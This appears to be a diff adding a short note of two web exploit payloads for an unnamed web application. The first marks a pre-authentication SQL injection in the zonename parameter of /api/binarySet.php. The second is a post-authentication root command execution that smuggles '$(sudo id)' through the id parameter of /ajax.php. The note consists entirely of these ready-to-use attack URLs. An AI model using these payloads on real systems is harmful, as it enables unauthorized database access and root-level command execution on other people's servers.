@@ -1,0 +1,7 @@
+pre auth sqli 
+
+/api/binarySet.php?zonename=123"
+
+post auth root RCE
+
+/ajax.php?Ajax=GetModal_ServicesInfo&id=homebridgenope;%20$(sudo%20id)&Action=disabled
